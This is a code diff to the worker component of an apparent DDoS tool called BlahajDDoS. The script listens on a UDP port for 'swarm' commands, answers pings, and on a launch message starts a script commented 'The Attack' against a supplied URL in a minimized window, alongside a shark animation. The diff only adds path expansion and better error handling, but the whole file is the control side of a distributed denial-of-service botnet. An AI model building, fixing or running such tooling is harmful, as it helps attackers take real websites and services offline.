@@ -5,12 +5,19 @@ import json
 
 # --- CONFIGURATION ---
 PORT = 55555
-PROJECT_DIR = r"%USERPROFILE%\Downloads\BlahajDDoS-main\BlahajDDoS-main\Blahajddos\Worker"
+# Use expandvars to resolve %USERPROFILE% dynamically for any user
+RAW_PATH = r"%USERPROFILE%\Downloads\BlahajDDoS-main\BlahajDDoS-main\Blahajddos\Worker"
+PROJECT_DIR = os.path.expandvars(RAW_PATH)
+
 BEAMER_FILE = os.path.join(PROJECT_DIR, "blahajbeamer.py")
 ANIM_FILE = os.path.join(PROJECT_DIR, "shark_anim.py")
 
 def start_worker():
     # Verify files exist
+    if not os.path.exists(PROJECT_DIR):
+        print(f"[!] Directory not found: {PROJECT_DIR}")
+        return
+
     for f in [BEAMER_FILE, ANIM_FILE]:
         if not os.path.exists(f):
             print(f"[!] Warning: {f} not found!")
@@ -20,8 +27,8 @@ def start_worker():
     
     try:
         sock.bind(('', PORT))
-    except:
-        print("[!] Port busy. Kill python.exe processes.")
+    except Exception as e:
+        print(f"[!] Port busy or Bind Error: {e}")
         return
 
     print(f"[*] Worker 'Eto' Ready. Waiting for Swarm Command...")
@@ -36,7 +43,6 @@ def start_worker():
             sock.sendto(b"BLAHAJ_ACK", addr)
             
         elif data.startswith(b"LAUNCH|"):
-            # Stop existing processes if a new raid starts
             if beamer_proc: beamer_proc.terminate()
             if anim_proc: anim_proc.terminate()
             
@@ -45,7 +51,6 @@ def start_worker():
                 conf = json.loads(payload)
                 
                 # 1. LAUNCH THE BEAMER (The Attack)
-                # We use 'start /min' to keep the attack window out of the way
                 beamer_cmd = (
                     f'start /min cmd /k python "{BEAMER_FILE}" '
                     f'--url {conf["url"]} --mode {conf["mode"]} '
@@ -55,7 +60,6 @@ def start_worker():
                 beamer_proc = subprocess.Popen(beamer_cmd, shell=True, cwd=PROJECT_DIR)
 
                 # 2. LAUNCH THE ANIMATION (The Visuals)
-                # This opens in a fresh, focused window
                 anim_cmd = f'start cmd /k python "{ANIM_FILE}"'
                 anim_proc = subprocess.Popen(anim_cmd, shell=True, cwd=PROJECT_DIR)
 
